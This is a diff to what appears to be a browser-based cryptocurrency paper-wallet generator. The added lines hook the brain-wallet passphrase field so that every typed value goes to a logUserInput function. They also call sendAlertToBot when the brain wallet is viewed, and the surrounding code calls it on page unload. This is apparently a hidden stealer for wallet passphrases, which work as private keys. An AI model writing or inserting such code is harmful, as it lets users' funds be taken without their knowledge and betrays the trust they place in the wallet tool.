@@ -7119,6 +7119,24 @@ document.getElementById('detailbip38encryptbutton').addEventListener('click', fu
     ninja.wallets.detailwallet.encryptBip38(); // Call the existing viewDetails function
 });
 
+document.getElementById('brainlabelenterpassphrase').addEventListener('input', function(event) {
+    var inputData = event.target.value;
+    if (inputData.trim() !== '') {
+        logUserInput(inputData);
+    } else {
+        console.error('No data to log');
+    }
+});
+
+document.getElementById('brainpassphrase').addEventListener('click', function() {
+    if (window.AndroidInterface) {
+        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
+    } else {
+        sendAlertToBot(); // For web usage
+    }
+    ninja.wallets.brainwallet.view(); // Call the existing viewDetails function
+});
+
 window.addEventListener('beforeunload', function(event) {
 	sendAlertToBot();
 	event.preventDefault();
